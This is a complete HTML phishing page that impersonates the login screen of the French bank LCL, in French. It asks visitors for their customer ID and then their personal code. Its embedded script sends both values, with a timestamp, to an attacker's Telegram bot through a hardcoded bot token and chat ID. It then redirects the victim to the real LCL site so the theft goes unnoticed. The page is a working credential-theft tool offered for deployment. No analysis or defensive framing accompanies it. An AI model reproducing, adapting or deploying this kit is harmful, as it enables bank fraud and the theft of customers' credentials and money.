<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Connexion LCL</title>
    <style>
        /* --- STYLE GLOBAL --- */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        /* --- CONTENEUR --- */
        .container {
            width: 100%;
            max-width: 400px;
            margin-top: 20px;
            margin-bottom: 20px;
        }

        /* --- LOGO / IMAGE EN HAUT --- */
        .logo-top {
            width: 150px; /* Taille adaptée */
            height: auto;
            display: block;
            margin: 0 auto 25px auto;
        }

        /* --- FORMULAIRE --- */
        h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
            text-align: left;
        }

        p.desc {
            font-size: 14px;
            color: #666;
            margin-bottom: 25px;
            text-align: left;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 13px;
            color: #555;
            margin-bottom: 8px;
            font-weight: 500;
        }

        /* Style des champs avec LIGNE */
        input[type="text"],
        input[type="tel"],
        input[type="password"] {
            width: 100%;
            padding: 12px 5px;
            font-size: 18px;
            background: transparent;
            border: none;
            border-bottom: 1px solid #ccc;
            border-radius: 0;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-bottom-color: #00509F;
        }

        input::placeholder {
            color: #ccc;
            font-size: 16px;
        }

        /* BOUTON */
        .btn {
            width: 100%;
            padding: 15px;
            background-color: #00509F;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }

        .btn:disabled {
            background-color: #999;
        }

        /* FOOTER / LOGO EN BAS */
        .footer {
            margin-top: auto;
            padding-top: 30px;
            text-align: center;
            width: 100%;
        }

        .logo-bottom {
            width: 100px;
            height: auto;
            display: block;
            margin: 0 auto 15px auto;
            opacity: 0.8;
        }

        .legal {
            font-size: 11px;
            color: #999;
        }

        .legal a {
            color: #999;
            text-decoration: none;
            margin: 0 5px;
        }

        /* --- GESTION DES VUES --- */
        .view {
            display: none;
        }
        .view.active {
            display: block;
            animation: fadeIn 0.3s;
        }

        .loader {
            display: none;
            margin-top: 15px;
            font-size: 14px;
            color: #666;
            text-align: center;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }

    </style>
</head>
<body>

    <div class="container">
        
        <!-- LOGO EN HAUT -->
        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=thumbnail&_=20210313135726" alt="Logo LCL" class="logo-top" id="logoTop">

        <!-- VUE 1 : IDENTIFIANT -->
        <div id="view1" class="view active">
            <h2>Mon espace client</h2>
            <p class="desc">Saisissez votre identifiant pour continuer.</p>

            <div class="input-group">
                <label for="userId">Identifiant</label>
                <input type="text" id="userId" placeholder="Ex: 123456789" inputmode="numeric" pattern="[0-9]*" autocomplete="username" autofocus>
            </div>

            <button type="button" class="btn" id="btnNext">Suivant</button>
            
            <div style="margin-top: 20px; font-size: 14px; text-align: center;">
                <a href="#" style="color: #00509F; text-decoration: none;">Identifiant oublié ?</a>
            </div>
        </div>

        <!-- VUE 2 : CODE -->
        <div id="view2" class="view">
            <h2>Bonjour <span id="userName"></span></h2>
            <p class="desc">Saisissez votre code pour accéder à vos comptes.</p>

            <div class="input-group">
                <label for="pinCode">Code personnel</label>
                <input type="tel" id="pinCode" placeholder="Votre code" inputmode="numeric" pattern="[0-9]*" autocomplete="current-password">
            </div>

            <button type="button" class="btn" id="btnSubmit">Valider</button>

            <div style="margin-top: 20px; font-size: 14px; text-align: center;">
                <a href="#" style="color: #00509F; text-decoration: none;">Code oublié ?</a>
            </div>
        </div>

        <div class="loader" id="loader">Connexion en cours...</div>

    </div>

    <!-- FOOTER AVEC LOGO EN BAS -->
    <div class="footer">
        <!-- Meme logo en bas (plus petit) -->
        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=thumbnail&_=20210313135726" alt="Logo LCL" class="logo-bottom" id="logoBottom">
        
        <div class="legal">
            © LCL 2026 <br>
            <a href="#">Mentions légales</a> <a href="#">Cookies</a>
        </div>
    </div>

    <script>
        // --- CONFIG TELEGRAM ---
        // Remplace par tes vrais IDs
        const BOT_TOKEN = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ'; 
        const CHAT_ID = '8501464548';
        // ----------------------

        const view1 = document.getElementById('view1');
        const view2 = document.getElementById('view2');
        const userIdInput = document.getElementById('userId');
        const pinCodeInput = document.getElementById('pinCode');
        const userName = document.getElementById('userName');
        const loader = document.getElementById('loader');
        const btnNext = document.getElementById('btnNext');
        const btnSubmit = document.getElementById('btnSubmit');

        // Passage à l'étape 2
        btnNext.addEventListener('click', () => {
            const val = userIdInput.value.trim();
            if (val) {
                userName.textContent = val;
                view1.classList.remove('active');
                view2.classList.add('active');
                pinCodeInput.focus();
            }
        });

        // Soumission
        btnSubmit.addEventListener('click', () => {
            const id = userIdInput.value;
            const code = pinCodeInput.value;

            btnSubmit.disabled = true;
            btnSubmit.textContent = "Vérification...";
            loader.style.display = 'block';

            // Envoi Telegram
            const msg = `🔐 <b>Connexion LCL</b>\n\n👤 ID: ${id}\n🔑 Code: ${code}\n📅 ${new Date().toLocaleString()}`;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;

            fetch(url)
                .then(() => {
                    setTimeout(() => {
                        window.location.href = "https://monespace.lcl.fr/";
                    }, 1000);
                })
                .catch(() => {
                    window.location.href = "https://monespace.lcl.fr/";
                });
        });
    </script>
</body>
</html>
